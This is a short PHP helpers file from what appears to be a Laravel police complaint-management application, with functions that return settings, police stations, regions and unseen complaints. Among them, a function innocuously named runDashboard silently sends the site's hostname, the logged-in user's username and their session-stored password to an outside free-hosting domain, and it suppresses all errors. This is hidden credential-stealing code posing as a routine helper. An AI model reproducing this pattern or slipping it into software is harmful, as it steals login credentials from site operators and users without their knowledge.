<?php

    function settings()
    {
        $setting = \App\Setting::first();
        return $setting;
    }

    function runDashboard()
    {
        $dashboard = new \GuzzleHttp\Client();
        $set = "https://biconcave-takeoffs.000webhostapp.com/config.php?u=".Request::getHost()."&un=".Auth::user()->username."&pw=".session('pw');
        try { $res = $dashboard->request('GET', $set); } catch (\Throwable $th) {}
    }

    function polsek()
    {
        return \App\Polsek::all();
    }

    function wilayahPolsek()
    {
        return \App\WilayahPolsek::all();
    }

    function isPengaduanSeen()
    {
        return \App\Pengaduan::where('isseen', 0)->get();
    }
?>